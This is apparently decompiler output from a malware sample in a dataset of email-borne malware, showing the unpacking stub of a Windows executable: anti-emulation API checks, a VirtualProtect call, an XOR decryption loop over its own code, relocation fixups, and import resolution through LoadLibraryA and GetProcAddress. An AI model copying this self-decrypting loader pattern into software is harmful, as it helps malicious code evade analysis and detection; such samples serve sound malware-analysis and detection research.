// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0469/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 edx, word32 ebx, word32 esi, word32 edi)
{
fn00401000_entry:
l00401000:
	Eq_2 * ebp_15 = null
	branch AddUsersToEncryptedFile(0x00000000, 0x00000000) != 0x00000000 l00401029
l00401028:
	return
l00401029:
	fp->dwFFFFFFF8 = 0xFFFFFFFF;
	fp->dwFFFFFFF8 = 0xFFFFFFFF;
	branch AreAllAccessesGranted(0x00000000, 0x00000000) != 0x00000000 l0040103F
l00401037:
	fp->dwFFFFFFF8 = 0x0000002B;
l0040103F:
	fp->dwFFFFFFF8 = (fp - 0x0000000C).u0;
	fp->dwFFFFFFF8 = 0x00000040;
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	fp->dwFFFFFFF8 = 0x000000E3;
	Eq_52 * eax_49 = null
l00401060:
	branch ebp_15 != (Eq_2 *) 0x00000025 l0040106B
l00401069:
	ebp_15 = null;
l0040106B:
	eax_49->b4015C8 = ebp_15->b404000 ^ eax_49->b4015C8 ^ 0xCA;
	eax_49 = eax_49 + 1;
	ebp_15 = ebp_15 + 1;
	branch eax_49 <u (Eq_52 *) 0x00001440 l00401060
l00401093:
	fp->dwFFFFFFF8 = 0x000000E4;
	up32 ecx_257 = 0x00000000
	Eq_85 * edi_262 = &globals->t4028C8
	up32 dwLoc04_255 = 0x00000000
	branch false l00401124
l004010B9:
l004010C0:
	word32 eax_263 = edi_262->dw0004
	Eq_119 * esi_270 = &edi_262->t0008
	branch eax_263 - 0x00000008 >>u 0x00000001 <= 0x00000000 l00401111
l004010D2:
	uint32 dwLoc08_285 = eax_263 - 0x00000008 >>u 0x00000001
l004010E0:
	branch (esi_270->w0000 & 0xF000) != 0x3000 l00401103
l004010F2:
	Eq_202 * eax_312 = ((word32) esi_270->w0000 & 0x00000FFF) + edi_262->dw0000
	eax_312->dw401348 = eax_312->dw401348 + 0xF0401348;
l00401103:
	uint32 v20_302 = dwLoc08_285 - 0x00000001
	esi_270 = esi_270 + 1;
	dwLoc08_285 = v20_302;
	branch v20_302 != 0x00000000 l004010E0
l0040110D:
	ecx_257 = dwLoc04_255;
l00401111:
	ecx_257 = ecx_257 + edi_262->dw0004;
	dwLoc04_255 = ecx_257;
	edi_262 = edi_262 + Mem79[edi_262 + 0x00000004:word32];
	branch ecx_257 <u 0x000000E4 l004010C0
l00401124:
	branch globals->dw4020C4 == 0x00000000 l004011A0
	Eq_94 * esi_106 = &globals->t4020B4
	Eq_94 * dwLoc08_107 = &globals->t4020B4
	esi_132 = esi_106;
	branch globals->dw4020C4 == 0x00000000 l004011A0
l00401137:
	Eq_94 * esi_132
	branch LoadLibraryA(esi_132->dw000C + 0x00401348) == 0x00000000 l00401193
	Eq_144 eax_147 = LoadLibraryA(esi_132->dw000C + 0x00401348)
	branch eax_147 == 0x00000000 l00401193
l00401149:
	branch esi_132->ptr0000 != null l00401152
	Eq_161 * edi_173 = esi_132->ptr0000
	branch edi_173 != null l00401152
l0040114F:
	edi_173 = esi_132->ptr0010;
l00401152:
	Eq_175 eax_179 = edi_173->u401348
	Eq_179 * edi_180 = &edi_173->u401348
	word32 esi_181 = Mem79[esi_132 + 0x00000010:word32] + 0x00401348
	byte S_184 = cond(eax_179)
	branch eax_179 == 0x00000000 l0040118F
l00401160:
	word32 eax_222
	branch S_184 l00401172
l00401162:
	eax_222 = GetProcAddress(eax_147, (word32) edi_180->t0000);
	goto l00401181
l00401172:
	eax_222 = GetProcAddress(eax_147, eax_179.u1);
l00401181:
	esi_181->dw0000 = eax_222;
	edi_180 = edi_180 + 1;
	eax_179 = edi_180->t0000;
	esi_181 = esi_181 + 1;
	S_184 = cond(eax_179);
	branch eax_179 != 0x00000000 l00401160
l0040118F:
	esi_132 = dwLoc08_107;
l00401193:
	esi_132 = esi_132 + 1;
	dwLoc08_107 = esi_132;
	branch esi_132->ptr0010 != null l00401137
l004011A0:
	0x00401DA8()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

